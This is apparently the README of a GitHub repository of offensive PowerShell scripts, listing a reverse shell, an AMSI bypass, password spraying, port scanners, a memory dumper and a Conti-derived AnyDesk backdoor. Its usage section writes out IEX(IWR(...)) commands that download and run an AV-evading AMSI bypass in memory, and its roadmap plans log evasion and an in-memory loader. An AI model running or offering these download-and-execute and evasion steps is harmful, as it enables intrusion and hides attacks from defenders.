![logo](https://user-images.githubusercontent.com/69973378/147786741-83944a0f-2ee8-49f7-bdb4-406f0a70ba84.png)

This repo is a collection of minimalist yet effective powershell offensive securities scripts. The goal is to have a very tiny toolkit, enabling a per need basis to allow minimal footprinting (although it is far from perfect and relying only on an AMSI-Bypass will get you caught by EDR once you start doing shady things such as port opening)

All these scripts are made available for educational purposes only. Using them without system owners'consent is illegal and will give you a free jail trip.
They are all provided without warranty and they may or may not break things. You are responsible of the scripts you run.

# usage
All the scripts can be used locally but since we're using powershell and we're trying to be sneaky it is probably better to load them from a webserver using the classic IEX(IWR('https://raw.githubusercontent.com/RaouzRouik/smallposh/main/thescriptyouwant.ps1')) or on your very own webserver if you prefer

You should definitely start by invoking:

IEX(IWR('https://raw.githubusercontent.com/RaouzRouik/smallposh/main/amsibp-dec-2021-fud.ps1'))

or else AV/EDR will surely block you right away!


# roadmap

Add extra doc on usage

Add a privesc script that will go wmic qfe

Add obfuscated version of each script so the blue team have less fun with their logs

Add an eventlogkiller (maybe)

Add a small PE/.Net injector/in-memory loader




# credits

All credits go to their respective owners:

revshell.ps1:  @TihanyiNorbert based on Nishang Framework

https://github.com/tihanyin/PSSW100AVB

amsibp-dec-2021-fud.ps1: @TihanyiNorbert based on Matt Graeber @mattifestation script

https://github.com/tihanyin/PSSW100AVB

ADspray.ps1, bannergrabber.ps1, smblogin.ps1, portscan-tcp.ps1, portscan-udp.ps1: InfosecMatter 

https://github.com/InfosecMatter/Minimalistic-offensive-security-tools

httpfileserv.ps1: 0v3rride

https://github.com/0v3rride/Simple-PowerShell-HTTP-File-Server

PortFWD.ps1: deepzec

https://github.com/deepzec/Win-PortFwd

minidump.ps1: Matt Graeber @mattifestation

anydesk-backdoor.ps1: Conti Operators Manual (credit is credit)

